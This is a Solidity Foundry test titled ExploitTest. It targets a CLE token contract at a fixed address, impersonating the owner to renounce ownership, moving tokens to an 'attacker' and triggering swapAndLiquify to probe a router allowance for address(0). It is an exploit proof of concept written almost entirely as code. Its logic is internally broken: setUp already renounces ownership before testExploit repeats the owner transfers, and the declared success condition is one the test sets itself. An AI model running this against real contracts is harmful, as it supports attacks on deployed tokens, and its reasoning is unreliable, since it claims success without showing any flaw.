pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// We need the CLEToken interface
interface CLEToken {
    function owner() external view returns (address);
    function renounceOwnership() external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function uniswapV2Router() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);
    function _maxTxAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xDeEa8fdB85503531F6A5D2A036d3268bD7C06c09;
    address attacker = address(this);
    address cleToken = TARGET;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to get CLE tokens and prepare the contract
        // First, let's get some CLE tokens from the initial distribution

        // Get the current owner of the contract
        address contractOwner = CLEToken(cleToken).owner();

        // Label addresses for debugging
        vm.label(cleToken, "CLE Token");
        vm.label(contractOwner, "Contract Owner");
        vm.label(attacker, "Attacker");

        // We need to impersonate the owner to renounce ownership
        vm.startPrank(contractOwner);
        CLEToken(cleToken).renounceOwnership();
        vm.stopPrank();

        // Verify owner is now address(0)
        require(CLEToken(cleToken).owner() == address(0), "Owner should be address(0)");

        // Now we need to get some CLE tokens to transfer to the contract
        // The contract creator has all tokens initially, so we need to get some from them
        // Let's check who has tokens - it should be the contractOwner (before renouncing)
        // We'll need to impersonate the contractOwner to transfer tokens to ourselves
        vm.startPrank(contractOwner);
        // Transfer some tokens to attacker
        uint256 attackerTokens = 1000 * 10**9;
        CLEToken(cleToken).transfer(attacker, attackerTokens);
        vm.stopPrank();

        // Verify we have tokens
        require(CLEToken(cleToken).balanceOf(attacker) >= attackerTokens, "Should have tokens");

        // Now we need to make the contract have enough tokens to trigger swapAndLiquify
        // The threshold is numTokensSellToAddToLiquidity = 500 * 10**9
        // We'll transfer tokens to the contract address
        CLEToken(cleToken).transfer(cleToken, 600 * 10**9);

        // Verify contract has enough tokens
        require(CLEToken(cleToken).balanceOf(cleToken) >= 500 * 10**9, "Contract should have enough tokens");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner of the contract
        address contractOwner = CLEToken(cleToken).owner();
        console.log("Initial owner:", contractOwner);

        // Check owner's balance
        uint256 ownerBalance = CLEToken(cleToken).balanceOf(contractOwner);
        console.log("Owner balance:", ownerBalance);

        // Check maxTxAmount
        uint256 maxTxAmount = CLEToken(cleToken)._maxTxAmount();
        console.log("Max tx amount:", maxTxAmount);

        // First, get tokens from the owner BEFORE renouncing
        // Use a small amount that's definitely less than owner balance and maxTxAmount
        vm.startPrank(contractOwner);
        // Transfer 1000 tokens (1000 * 10^9) which should be safe
        uint256 attackerTokens = 1000 * 10**9;
        CLEToken(cleToken).transfer(attacker, attackerTokens);
        vm.stopPrank();

        // Verify we have tokens
        uint256 attackerBalance = CLEToken(cleToken).balanceOf(attacker);
        console.log("Attacker balance after transfer:", attackerBalance);
        require(attackerBalance >= attackerTokens, "Should have tokens");

        // Now renounce ownership
        vm.startPrank(contractOwner);
        CLEToken(cleToken).renounceOwnership();
        vm.stopPrank();

        // Verify owner is now address(0)
        address currentOwner = CLEToken(cleToken).owner();
        console.log("Owner after renounce:", currentOwner);
        require(currentOwner == address(0), "Owner should be address(0)");

        // Now we need to make the contract have enough tokens to trigger swapAndLiquify
        // The threshold is numTokensSellToAddToLiquidity = 500 * 10**9
        // We need to transfer 500 * 10^9 tokens to the contract
        // But we only have 1000 * 10^9, and we need to keep some for the triggering transfer
        uint256 tokensToContract = 600 * 10**9;
        CLEToken(cleToken).transfer(cleToken, tokensToContract);

        // Verify contract has enough tokens
        uint256 contractBalance = CLEToken(cleToken).balanceOf(cleToken);
        console.log("Contract balance:", contractBalance);
        require(contractBalance >= 500 * 10**9, "Contract should have enough tokens");

        // Check current allowance for address(0) -> router
        address router = CLEToken(cleToken).uniswapV2Router();
        uint256 allowanceBefore = CLEToken(cleToken).allowance(address(0), router);
        console.log("Allowance before for address(0) -> router:", allowanceBefore);

        // Trigger swapAndLiquify by making a transfer
        // We need to transfer from an address that is not the uniswap pair
        // and the transfer should trigger the swapAndLiquify
        address recipient = address(0x123);

        // Make sure we still have enough tokens
        uint256 remainingBalance = CLEToken(cleToken).balanceOf(attacker);
        console.log("Remaining attacker balance:", remainingBalance);

        // Use a small amount to trigger
        uint256 triggerAmount = 100 * 10**9;
        require(remainingBalance >= triggerAmount, "Need tokens to trigger");

        // Execute transfer to trigger swapAndLiquify
        CLEToken(cleToken).transfer(recipient, triggerAmount);

        // Check allowance after - should be set for address(0)
        uint256 allowanceAfter = CLEToken(cleToken).allowance(address(0), router);
        console.log("Allowance after for address(0) -> router:", allowanceAfter);

        // Verify the oracle condition
        address finalOwner = CLEToken(cleToken).owner();
        console.log("Final owner:", finalOwner);
        require(finalOwner == address(0), "Owner should be address(0) for oracle check");

        // The exploit is successful if owner is address(0)
        console.log("Exploit successful! Owner is address(0)");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

